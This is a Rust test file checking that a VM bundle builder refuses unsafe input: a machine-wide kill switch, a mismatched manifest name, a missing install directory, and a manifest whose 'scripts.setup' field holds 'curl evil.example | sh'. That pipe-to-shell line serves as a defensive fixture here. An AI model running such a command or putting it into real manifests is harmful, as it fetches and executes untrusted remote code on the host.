//! The compose-facing bundle entry point: build the VM, do not start it.
//!
//! `start_bundle_worker` spawns a detached VM and answers with an exit code.
//! Compose supervises its own children, so it needs the command instead — and
//! every gate the detached path applies has to apply here too, because the
//! payload is publisher-controlled either way.

use std::path::Path;

use iii_worker::cli::local_worker::{VmOverride, bundle_vm_command};

fn install_dir(tmp: &Path, manifest: &str) -> std::path::PathBuf {
    let dir = tmp.join("bundle");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("iii.worker.yaml"), manifest).unwrap();
    dir
}

fn over(tmp: &Path) -> VmOverride<'static> {
    VmOverride {
        state_dir: tmp.join("vm"),
        engine_url: "ws://localhost:49134",
        extra_env: std::collections::HashMap::new(),
        config_dir: None,
    }
}

const MANIFEST: &str = "name: probe\nscripts:\n  start: node bundle.js\n";

/// The kill switch exists so an operator can refuse bundles machine-wide. A
/// second way in that ignores it would make the switch a lie.
#[tokio::test]
async fn the_operator_kill_switch_refuses_the_build() {
    let tmp = tempfile::tempdir().unwrap();
    let dir = install_dir(tmp.path(), MANIFEST);

    // SAFETY: single-threaded test, and the variable is removed before it ends.
    unsafe { std::env::set_var("III_BUNDLE_WORKERS_DISABLED", "1") };
    let result = bundle_vm_command("probe", &dir, over(tmp.path())).await;
    unsafe { std::env::remove_var("III_BUNDLE_WORKERS_DISABLED") };

    let err = result.err().expect("a disabled bundle must not build");
    assert!(err.contains("disabled"), "{err}");
    assert!(err.contains("probe"), "{err}");
}

/// The install dir sits on the host filesystem, so the manifest may have been
/// swapped since install. `scripts.setup` is the field the strict validator
/// exists to refuse.
#[tokio::test]
async fn a_manifest_with_scripts_setup_is_refused() {
    let tmp = tempfile::tempdir().unwrap();
    let dir = install_dir(
        tmp.path(),
        "name: probe\nscripts:\n  start: node bundle.js\n  setup: curl evil.example | sh\n",
    );

    let err = bundle_vm_command("probe", &dir, over(tmp.path()))
        .await
        .err()
        .expect("scripts.setup must not reach a boot");
    assert!(err.contains("probe"), "{err}");
}

/// A manifest naming a different worker is refused: the name is what the
/// install dir is keyed by, and a mismatch means the two disagree about which
/// worker this is.
#[tokio::test]
async fn a_manifest_naming_another_worker_is_refused() {
    let tmp = tempfile::tempdir().unwrap();
    let dir = install_dir(
        tmp.path(),
        "name: somebody-else\nscripts:\n  start: node x.js\n",
    );

    assert!(
        bundle_vm_command("probe", &dir, over(tmp.path()))
            .await
            .is_err(),
        "a mismatched manifest name must not build"
    );
}

#[tokio::test]
async fn a_missing_install_directory_is_refused() {
    let tmp = tempfile::tempdir().unwrap();

    assert!(
        bundle_vm_command("probe", &tmp.path().join("not-here"), over(tmp.path()))
            .await
            .is_err(),
        "a missing install dir must not build"
    );
}

/// The success path: a valid bundle produces a `__vm-boot` command carrying the
/// caller's env and config mount, and nothing is spawned.
///
/// Ignored by default because preparing the rootfs pulls an OCI base image.
#[tokio::test]
#[ignore = "pulls an OCI base image"]
async fn a_valid_bundle_builds_a_boot_command() {
    let tmp = tempfile::tempdir().unwrap();
    let dir = install_dir(tmp.path(), MANIFEST);
    let config_dir = tmp.path().join("config");
    std::fs::create_dir_all(&config_dir).unwrap();

    let mut env = std::collections::HashMap::new();
    env.insert("III_NAMESPACE".to_string(), "shop-dev".to_string());
    env.insert(
        "III_CONFIG".to_string(),
        "/run/iii/config/api.yaml".to_string(),
    );

    let built = bundle_vm_command(
        "probe",
        &dir,
        VmOverride {
            state_dir: tmp.path().join("vm"),
            engine_url: "ws://localhost:49134",
            extra_env: env,
            config_dir: Some(config_dir.clone()),
        },
    )
    .await
    .expect("a valid bundle should build");

    let rendered = format!("{:?}", built.command.as_std());
    assert!(rendered.contains("__vm-boot"), "{rendered}");
    // The caller's env reaches the guest as boot arguments.
    assert!(rendered.contains("III_NAMESPACE=shop-dev"), "{rendered}");
    assert!(
        rendered.contains("III_CONFIG=/run/iii/config/api.yaml"),
        "{rendered}"
    );
    // And its config directory is published where that path resolves.
    assert!(
        rendered.contains(&format!("{}:/run/iii/config", config_dir.display())),
        "{rendered}"
    );
    // The state dir is the caller's, not ~/.iii/managed/probe.
    assert!(
        rendered.contains(&tmp.path().join("vm").display().to_string()),
        "{rendered}"
    );
}
